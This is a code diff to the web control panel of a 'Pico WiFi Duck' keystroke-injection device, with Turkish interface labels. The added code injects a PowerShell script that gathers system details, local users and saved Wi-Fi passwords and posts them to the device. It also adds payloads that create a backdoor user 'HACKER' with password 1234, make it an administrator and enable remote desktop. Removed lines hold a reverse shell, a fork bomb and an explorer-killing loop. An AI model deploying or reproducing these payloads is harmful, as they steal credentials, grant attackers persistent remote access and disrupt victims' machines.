@@ -6,16 +6,18 @@
     <title>Pico WiFi Duck</title>
     <style>
         body{font-family:Arial;background:#36393e;margin:0;padding:20px;color:#fff}
-        .container{display:flex;gap:20px;max-width:900px;margin:0 auto}
+        .container{display:flex;gap:20px;max-width:1000px;margin:0 auto}
         .panel{background:#2f3136;padding:20px;border-radius:8px;flex:1}
         h2{color:#fff;font-size:1.2rem;margin:0 0 15px 0}
-        textarea{width:100%;height:250px;padding:10px;background:#1a1a1a;color:#0f0;border:none;border-radius:4px;font-family:monospace;box-sizing:border-box;resize:vertical}
+        h3{color:#ff0;font-size:1rem;margin:15px 0 10px 0}
+        textarea{width:100%;height:200px;padding:10px;background:#1a1a1a;color:#0f0;border:none;border-radius:4px;font-family:monospace;box-sizing:border-box;resize:vertical}
         button{background:#ffc107;color:#000;padding:12px;margin:5px 0;border:none;border-radius:4px;cursor:pointer;font-size:14px;width:100%;font-weight:bold}
         button:hover{opacity:0.9}
         .blue{background:#2196F3;color:#fff}
         .green{background:#4CAF50;color:#fff}
         .red{background:#f44336;color:#fff}
         .purple{background:#9c27b0;color:#fff}
+        .orange{background:#ff9800;color:#fff}
         .status{background:#1a1a1a;padding:10px;border-radius:4px;margin:10px 0;font-size:12px}
         .btn-group{display:flex;gap:5px;flex-wrap:wrap}
         .btn-group button{flex:1;min-width:70px;font-size:12px;padding:8px}
@@ -41,9 +43,14 @@
             <button class="blue" onclick="send('/jiggle/combined')">🖱️⌨️ Mouse+Klavye</button>
             <button class="red" onclick="send('/jiggle/stop')">⏹️ DURDUR</button>
             
-            <h2 style="margin-top:20px">📊 Bilgi Topla</h2>
-            <button class="purple" onclick="stealAll()">🔍 Tüm Bilgileri Topla</button>
+            <h3>📊 Bilgi Toplama</h3>
+            <button class="purple" onclick="stealAll()">🔍 TÜM BİLGİLERİ TOPLA</button>
             <button class="green" onclick="location.href='/view'">👁️ Görüntüle</button>
+            
+            <h3>👤 Hesap İşlemleri</h3>
+            <button class="orange" onclick="createUser()">➕ Yeni Kullanıcı Oluştur (1234)</button>
+            <button class="orange" onclick="makeAdmin()">👑 Admin Yap</button>
+            <button class="red" onclick="enableRDP()">🖥️ RDP Aç</button>
             
             <div class="status" id="status">
                 ⚡ Hazır<br>
@@ -71,24 +78,53 @@
             send('/api', {content: payload});
         }
         
-       function stealAll() {
-    let cmd = "$w=@();netsh wlan show profiles|sls ':'|%{$w+=$_.ToString().Split(':')[1].Trim()};$s=@{type='all';wifi=@();pc=$env:COMPUTERNAME;user=$env:USERNAME;os=(gwmi win32_operatingsystem).caption;tarih=(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')};foreach($n in $w){$p=netsh wlan show profile name=$n key=clear|sls 'Key Content';if($p){$pw=$p.ToString().Replace('Key Content            : ','')}else{$pw='(Acik)'};$s.wifi+=@{ssid=$n;pwd=$pw}};$s.cpu=(gwmi win32_processor).Name;$s.ram=[math]::Round((gwmi win32_computersystem).TotalPhysicalMemory/1GB);$s.gpu=(gwmi win32_videocontroller).Name;$ip=gwmi Win32_NetworkAdapterConfiguration|?{$_.IPAddress -ne $null -and $_.DefaultIPGateway -ne $null};$s.ip=$ip.IPAddress[0];$s.mac=$ip.MACAddress;$s.uptime=(gwmi win32_operatingsystem).LastBootUpTime;$j=$s|ConvertTo-Json -Compress;irm 192.168.4.1/collect -Method POST -Body $j";
+        function stealAll() {
+    let cmd = "try {";
+    cmd += "$s=@{type='all';pc=$env:COMPUTERNAME;user=$env:USERNAME;tarih=(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')};";
+    cmd += "$s.os=(Get-WmiObject Win32_OperatingSystem).Caption;";
+    cmd += "$s.cpu=(Get-WmiObject Win32_Processor).Name;";
+    cmd += "$s.ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB);";
+    cmd += "$s.gpu=(Get-WmiObject Win32_VideoController).Name;";
+    cmd += "$ip=Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress -and $_.DefaultIPGateway};";
+    cmd += "$s.ip=$ip.IPAddress[0];$s.mac=$ip.MACAddress;";
+    cmd += "$s.uptime=(Get-WmiObject Win32_OperatingSystem).LastBootUpTime;";
+    cmd += "$s.bios=(Get-WmiObject Win32_BIOS).SerialNumber;";
+    cmd += "$s.disk=(Get-WmiObject Win32_DiskDrive | ForEach-Object {$_.Model}) -join ';';";
+    cmd += "$s.users=(Get-LocalUser | ForEach-Object {$_.Name}) -join ',';";
+    cmd += "$s.arp=arp -a | Out-String;";
+    cmd += "$w=@();netsh wlan show profiles | Select-String ':' | ForEach-Object {$w+=$_.ToString().Split(':')[1].Trim()};";
+    cmd += "$s.wifi=@();foreach($n in $w){";
+    cmd += "$p=netsh wlan show profile name=$n key=clear | Select-String 'Key Content';";
+    cmd += "if($p){$pw=$p.ToString().Replace('Key Content            : ','')}else{$pw='(Acik)'};";
+    cmd += "$s.wifi+=@{ssid=$n;pwd=$pw}};";
+    cmd += "$j=$s | ConvertTo-Json -Compress;";
+    cmd += "Invoke-RestMethod -Uri http://192.168.4.1/collect -Method POST -Body $j;";
+    cmd += "Write-Host 'Basarili' } catch { Write-Host 'Hata olustu' }";
     
     let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING " + cmd + "\nENTER\nDELAY 3000\nSTRING exit\nENTER";
-    
     document.getElementById('payload').value = script;
     send('/api', {content: script});
 }
-        
-        function loadScript(t) {
-            let s = {
-                'f-bomb': 'DELAY 300\nGUI r\nDELAY 100\nSTRING powershell while(1){ii **}\nENTER',
-                'explorer': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell while($true){Stop-Process -Name explorer -Force}\nENTER',
-                'wifi': 'DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nSTRING cd %userprofile%\\Desktop & netsh wlan export profile key=clear\nENTER',
-                'reverse': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell -c "$c=New-Object Net.Sockets.TCPClient(\'192.168.1.4\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);$s.Write($sb,0,$sb.Length)}"\nENTER'
-            };
-            document.getElementById('payload').value = s[t] || '';
-        }
+function createUser() {
+    let cmd = 'net user HACKER 1234 /add && net localgroup Users HACKER /add && net accounts /maxpwage:unlimited';
+    let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING " + cmd + "\nENTER\nDELAY 500\nSTRING exit\nENTER";
+    document.getElementById('payload').value = script;
+    send('/api', {content: script});
+}
+
+function makeAdmin() {
+    let cmd = 'net localgroup Administrators HACKER /add';
+    let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING " + cmd + "\nENTER\nDELAY 500\nSTRING exit\nENTER";
+    document.getElementById('payload').value = script;
+    send('/api', {content: script});
+}
+
+function enableRDP() {
+    let cmd = 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes';
+    let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING " + cmd + "\nENTER\nDELAY 1000\nSTRING exit\nENTER";
+    document.getElementById('payload').value = script;
+    send('/api', {content: script});
+}
     </script>
 </body>
 </html>
